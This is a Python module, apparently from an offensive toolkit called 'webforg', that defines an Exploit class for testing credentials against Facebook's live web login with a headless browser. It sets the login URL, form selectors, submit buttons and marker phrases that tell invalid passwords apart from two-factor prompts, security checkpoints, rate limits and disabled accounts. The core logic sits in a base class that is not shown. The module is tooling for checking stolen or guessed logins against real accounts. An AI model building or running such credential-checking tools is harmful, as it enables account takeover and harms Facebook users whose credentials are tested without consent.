"""Facebook Credential Tester — headless-browser login flow."""
from webforg.modules.auth.base_login_tester import BaseSocialLoginTester


class Exploit(BaseSocialLoginTester):
    name = "Facebook Credential Tester"
    description = "Tests credentials against Facebook's web login via a headless browser. Detects 2FA, checkpoints, rate limits, disabled accounts."
    author = "K0uR1i"
    rank = "manual"

    platform_name = "facebook"
    browser_login_url = "https://www.facebook.com/login/"
    username_selector = "input[name=email]"
    password_selector = "input[name=pass]"
    post_load_delay_ms = 2500
    submit_enter = False
    submit_selectors = ("div[role=button]:has-text('Log in')", "button[name=login]", "input[type=submit]")
    browser_login_paths = ("/login",)
    twofa_markers = (
        "two-factor", "two factor", "2fa", "verification code", "login approval",
        "enter the code", "security code", "log in approved",
    )
    challenge_markers = (
        "captcha", "security check", "unusual activity", "checkpoint",
        "confirm it's you", "identity confirmation",
    )
    rate_markers = (
        "too many attempts", "try again later", "temporarily blocked",
        "you've been temporarily", "slow down", "rate limit",
    )
    invalid_markers = (
        "the password you've entered is incorrect", "incorrect password",
        "password you've entered", "isn't connected to an account", "no account found",
        "wrong password", "email or phone number",
    )
